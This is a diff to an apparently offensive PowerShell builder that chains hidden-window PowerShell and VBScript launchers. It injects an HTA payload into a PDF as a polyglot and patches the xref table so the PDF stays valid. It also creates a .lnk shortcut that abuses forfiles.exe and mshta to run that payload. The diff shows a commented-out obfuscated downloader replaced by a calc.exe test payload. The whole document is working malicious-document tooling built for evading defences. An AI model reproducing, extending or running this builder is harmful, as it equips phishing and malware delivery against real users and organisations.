@@ -346,7 +346,7 @@ function New-SecondStageVBLauncher {
         $vbScript.Add((Get-RandomSleep -Min 5000 -Max 50000))
     }
     $vbScript.Add("Set objShell = CreateObject(`"WScript.Shell`"):")
-    $vbScript.Add("objShell.Run `"powershell.exe -w 1 -C $Payload`":")
+    $vbScript.Add("objShell.Run `"powershell.exe -w 1 -nop -nol -C $Payload`":")
     $vbScript
 }
 
@@ -359,47 +359,56 @@ function New-InsertHtaToPDF {
     $newPdf = [System.IO.FileStream]::new("$Dest\random.pdf", [System.IO.FileMode]::Create)
     $pdfBytes = [System.IO.File]::ReadAllBytes($Path)
     $pdfText = [System.Text.Encoding]::ASCII.GetString($pdfBytes)
-    $insertIndex = $pdfText.IndexOf("`n")
-    $newPdf.Write($pdfBytes, 0, $insertIndex)
+    $header = [System.Text.Encoding]::ASCII.GetBytes("%PDF-1.7`n")
+    $newPdf.Write($header, 0, $header.Length)
     # count pdf objects
     $objectsMatches = [regex]::Matches($pdfText, '(\d+)\s+0\s+obj')
     $objCount = ($objectsMatches | ForEach-Object { [int]$_.Groups[1].Value } | Measure-Object -Maximum).Maximum
     # insert object with correct id
 $htaObject = @"
-`n$($objCount + 1) 0 obj
+$($objCount + 1) 0 obj
 << /Filter /FlateDecode /Length $($HtaPayload.Length + 6) >>
 stream
 $HtaPayload
 <!--
 
 endstream
-endobj
+endobj`n
 "@
     $htaBytes = [System.Text.Encoding]::ASCII.GetBytes($htaObject)
     $newPdf.Write($htaBytes, 0, $htaBytes.Length)
     # write old objects
     $xrefMatch = [regex]::Match($pdfText,  "\r?\n+xref\r?\n")
-    $newPdf.Write($pdfBytes, $insertIndex + 1, $xrefMatch.Index - $insertIndex)
-    $xrefText = [System.Collections.Generic.List[string]]::new()
-    $xrefText.Add("xref`r`n0 $($objectsMatches.Count + 2)`r`n")
-    $xrefText.Add("0000000000 65535 f `r`n")
-    $xrefText.Add("{0:D10} 00000 n `r`n" -f ($insertIndex + 1))
-    foreach ($i in (0..($objectsMatches.Count - 1))) {
-        $xrefText.Add(("{0:D10} 00000 n `r`n" -f ($objectsMatches[$i].Index + $htaBytes.Length)))
+    if ($xrefMatch.Value -ne ""){
+        $lastObjIndex = $objectsMatches.Count - 1
+        $newObjCount = $objectsMatches.Count + 2
+        $xrefIndex = $xrefMatch.Index
     }
-    $xrefBytes = [System.Text.Encoding]::ASCII.GetBytes(-join $xrefText)
-    $newPdf.Write($xrefBytes, 0, $xrefBytes.Length)
-    $trailerMatch = [regex]::Match($pdfText, "trailer+\r?\n?\s?<<")
-    $trailer = -join $pdfText[$trailerMatch.Index..$pdfText.Length]
-    $trailerBytes = [System.Text.Encoding]::ASCII.GetBytes($trailer)
-    $sizeMatch = [regex]::Match($trailer, "/Size\s+(\d+)")
-    $newPdf.Write($trailerBytes, 0, $sizeMatch.Index)
-    $newSize = "/Size $($objectsMatches.Count + 2)"
-    $newPdf.Write([System.Text.Encoding]::ASCII.GetBytes($newSize), 0, $newSize.Length)
-    $startXrefMatch = [regex]::Match($trailer, "startxref+\r?\n?")
-    $newPdf.Write($trailerBytes, $sizeMatch.Index + $sizeMatch.Value.Length, $startXrefMatch.Index - ($sizeMatch.Index + $sizeMatch.Value.Length))
-    $end = "startxref`n$($xrefMatch.Index + $htaBytes.Length)`n%%EOF"
-    $newPdf.Write([System.Text.Encoding]::ASCII.GetBytes($end), 0, $end.Length)
+    else {
+        $lastObjIndex = $objectsMatches.Count - 2
+        $newObjCount = $objectsMatches.Count + 1
+        $xrefIndex = $objectsMatches[$objectsMatches.Count - 1].Index
+    }
+    $newPdf.Write($pdfBytes, $objectsMatches[0].Index, $xrefIndex - $objectsMatches[0].Index)
+    $eof = [System.Collections.Generic.List[string]]::new()
+    $eof.Add("`nxref`r`n0 $newObjCount`r`n")
+    $eof.Add("0000000000 65535 f `r`n")
+    foreach ($i in (0..($lastObjIndex))) {
+        $eof.Add(("{0:D10} 00000 n `r`n" -f ($objectsMatches[$i].Index + $htaBytes.Length)))
+    }
+    $eof.Add("{0:D10} 00000 n `r`n" -f $header.Length)
+    $eof.Add("trailer`n<<`n/Size $newObjCount`n")
+    $rootMatch = [regex]::Match($pdfText, "/Root\s(\d+)\s+\d\s+R")
+    $infoMatch = [regex]::Match($pdfText, "/Info\s(\d+)\s+\d\s+R")
+    if ($rootMatch.Value -ne ""){
+        $eof.Add($rootMatch.Value + "`n")
+    }
+    if ($infoMatch.Value -ne ""){
+        $eof.Add($infoMatch.Value + "`n")
+    }
+    $eof.Add(">>`nstartxref`n$($xrefIndex + $htaBytes.Length)`n%%EOF")
+    $eofBytes = [System.Text.Encoding]::ASCII.GetBytes(-join $eof)
+    $newPdf.Write($eofBytes, 0, $eofBytes.Length)
     $newPdf.Close()
 }
 
@@ -411,13 +420,14 @@ function New-LnkFile {
     )
     $shell = New-Object -ComObject WScript.Shell
     $lnk = $shell.CreateShortcut("$Dest.lnk")
-    $lnk.TargetPath = "C:\Windows\System32\forfiles.exe"
-    $lnk.Arguments = "/p . /m $Target /c `"cmd /c mshta $Target`""
+    $lnk.TargetPath = ".\forfiles.exe"
+    $lnk.Arguments = "/M $Target /C `"cmd /c mshta @path`""
     $lnk.IconLocation = $IconPath
     $lnk.Save()
 }
-$downloader = New-ObfuscatedDownloader -Url ttotot
-$psLauncher = New-PowershellLauncher -Payload $downloader
+#$downloader = New-ObfuscatedDownloader -Url ttotot
+$test = "iex calc.exe"
+$psLauncher = New-PowershellLauncher -Payload $test
 $secondStage = New-SecondStageVBLauncher -Payload $psLauncher
 $payload = New-FirstStageVBLauncher -Payload $secondStage
 $defaultDir = ".\payload"
